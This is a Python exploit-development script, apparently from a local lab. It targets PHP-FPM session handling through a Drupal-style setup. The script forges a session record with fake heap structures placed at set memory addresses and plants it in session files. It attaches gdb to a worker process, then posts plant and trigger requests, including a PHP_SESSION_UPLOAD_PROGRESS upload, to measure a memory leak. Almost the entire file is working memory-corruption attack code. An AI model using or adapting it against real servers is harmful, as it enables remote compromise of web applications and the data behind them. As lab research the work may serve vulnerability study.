#!/usr/bin/env python3
"""Safe fake-struct trigger: measure S_dest/K_dest with used=0, D=P+0x80, 81920-byte record."""
import json, os, re, struct, subprocess, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart

WORKER = int(sys.argv[1]) if len(sys.argv)>1 else 157474
TOTAL = int(sys.argv[2]) if len(sys.argv)>2 else 81920
P = int(sys.argv[3], 0) if len(sys.argv)>3 else 0x7f5e6aa82000
X = int(sys.argv[4], 0) if len(sys.argv)>4 else 0x7f5e6aa70000
USED = int(sys.argv[5], 0) if len(sys.argv)>5 else 0
OUT = LAB + "/arms/safe_leak_%d_%d_%d.json" % (WORKER, TOTAL, USED)
SMALL = b"S" * 32
N_LEAK = 4096
D_OFF = 0x80

def build_record(X, P, total, used):
    head = b"S|s:%d:\"" % len(SMALL) + SMALL + b'";'
    head += b"J|i:%d;" % N_LEAK
    L = total - len(head) - len('K|s:"') - 2 - 1
    for _ in range(12):
        hdr = b"K|s:%d:\"" % L
        want = total - len(head) - len(hdr) - 2
        if want == L: break
        L = want
    hdr = b"K|s:%d:\"" % L
    assert len(head) + len(hdr) + L + 2 == total, (len(head)+len(hdr)+L+2,total)
    blob = bytearray(b"A" * L)
    boff = len(head) + len(hdr)
    base = X + 24   # record data start (trigger X)
    def put_addr(addr, val):
        i = (addr - base) - boff
        assert 0 <= i and i + 8 <= L, (hex(addr), i, L, hex(base), boff)
        blob[i:i+8] = struct.pack("<Q", val & 0xffffffffffffffff)
    for off, val in ((0, P + 56), (8, 0), (16, P + D_OFF), (24, 0), (32, 0),
                     (40, 0), (48, 0x7fffffff), (56, 0), (64, 0)):
        put_addr(P + off, val)
    put_addr(P + D_OFF, used & 0xffffffffffffffff)
    put_addr(P + D_OFF + 8, 0)
    rec = head + hdr + bytes(blob) + b'";'
    assert len(rec) == total
    return rec, {'total':total,'L':L,'boff':boff,'base':base,'D':P+D_OFF,'used':used}

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

def reqs(lines):
    out={}
    for l in lines:
        m=re.match(r"\[[^]]+\] REQ(\d+) ", l)
        if not m: continue
        n=int(m.group(1)); d=out.setdefault(n,{})
        for key,pat in [
            ('heap', r"PHPRQ_START heap=(0x[0-9a-f]+)"),
            ('dec', r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)"),
            ('tmp', r"TMPVAR entry P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+)"),
            ('ret', r"TMPVAR ret slot=(0x[0-9a-f]+) dtor=(0x[0-9a-f]+) off=(-?\d+) used_now=(-?\d+) pre_val=(0x[0-9a-f]+) pre_type=(0x[0-9a-f]+)"),
            ('write', r"PS_WRITE val=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)"),
            ('shutdown', r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) first_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+) level=(\d+)"),
            ('uvar', r"UVAR ret=(\d+) cur=(0x[0-9a-f]+) val=(0x[0-9a-f]+) ti=(0x[0-9a-f]+)"),
            ('uvarstr', r"UVAR STR ZSTR ptr=(0x[0-9a-f]+) rc=(\d+) ti=([0-9a-f]+) h=([0-9a-f]+) len=(\d+)"),
            ('bail', r"ZEND_BAILOUT bg=(0x[0-9a-f]+)/(\d+)"),
        ]:
            mm=re.search(pat,l)
            if mm:
                if key=='heap': d['heap']=int(mm.group(1),16)
                elif key=='dec': d.setdefault('decodes',[]).append((int(mm.group(1),16),int(mm.group(2))))
                elif key=='tmp': d.setdefault('tmps',[]).append({'P':int(mm.group(1),16),'last':int(mm.group(2),16),'used':int(mm.group(3)),'next':int(mm.group(4),16)})
                elif key=='ret': d.setdefault('rets',[]).append({'slot':int(mm.group(1),16),'dtor':int(mm.group(2),16),'off':int(mm.group(3)),'used_now':int(mm.group(4))})
                elif key=='write': d['write']={'val':int(mm.group(1),16),'len':int(mm.group(2)),'head':mm.group(3)}
                elif key=='shutdown': d['shutdown']={'P':int(mm.group(1),16),'last':int(mm.group(2),16),'first':int(mm.group(3),16),'used':int(mm.group(4)),'next':int(mm.group(5),16),'level':int(mm.group(6))}
                elif key=='uvar': d.setdefault('uvars',[]).append({'ret':int(mm.group(1)),'cur':int(mm.group(2),16),'val':int(mm.group(3),16),'ti':int(mm.group(4),16)})
                elif key=='uvarstr': d.setdefault('uvarstrs',[]).append({'ptr':int(mm.group(1),16),'rc':int(mm.group(2)),'len':int(mm.group(5))})
                elif key=='bail': d.setdefault('bails',[]).append((int(mm.group(1),16),int(mm.group(2))))
    return out

w=current_worker(); res={'worker0':w,'total':TOTAL,'P':P,'X':X}
rec,geo=build_record(X,P,TOTAL,USED); res['geo']=geo; res['used_arg']=USED
res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
res['trigger_seed']=tool.seed(os.path.join(tool.SESS,'sess_tb1'),rec)
open(tool.GLOG,'w').close()
gout=open(LAB+'/logs/gdb_safe_leak.out','wb')
g=subprocess.Popen(['gdb','-q','--batch','-x',LAB+'/gdb/gb_measure.gdb','-p',str(w)],stdout=gout,stderr=subprocess.STDOUT,cwd=LAB,start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and 'armed' in open(tool.GLOG,errors='replace').read(): armed=True; break
    time.sleep(0.1)
res['gdb_armed']=armed
if not armed:
    print(open(LAB+'/logs/gdb_safe_leak.out',errors='replace').read()[-4000:]); raise SystemExit(2)
n0=tool.req_count()
r=tool.post('/exploit/sess.php',[field('form',b'x')],tag='safe_plant',timeout=60,cookie='pl1')
res['plant']={'status':r['status'],'head':r['body'][:200].decode('latin1')}
time.sleep(0.8)
n1=tool.req_count()
r=tool.post('/exploit/sess.php',[field('PHP_SESSION_UPLOAD_PROGRESS',b'x'),filepart()],tag='safe_trigger',timeout=120,cookie='tb1')
res['trigger']={'status':r['status'],'head':r['body'][:240].decode('latin1')}
time.sleep(1.2)
res['worker_after_trigger']=current_worker()
try:
    rd=tool.post('/exploit/detach.php',[field('form',b'x')],tag='safe_detach',timeout=30)
    res['detach']={'status':rd['status'],'head':rd['body'][:80].decode('latin1')}
except Exception as e: res['detach']={'err':str(e)}
time.sleep(0.5)
lines=open(tool.GLOG,errors='replace').read().splitlines()
res['reqs']=reqs(lines)
res['plant_req']=res['reqs'].get(n0+1)
res['trigger_req']=res['reqs'].get(n1+1)
raw=open(os.path.join(tool.SESS,'sess_tb1'),'rb').read()
res['file']={'len':len(raw),'head':raw[:128].hex()}
json.dump(res,open(OUT,'w'),indent=1,default=str)
print(json.dumps({k:res.get(k) for k in ('worker0','geo','plant','trigger','worker_after_trigger','plant_req','trigger_req','file','detach')},indent=1,default=str))
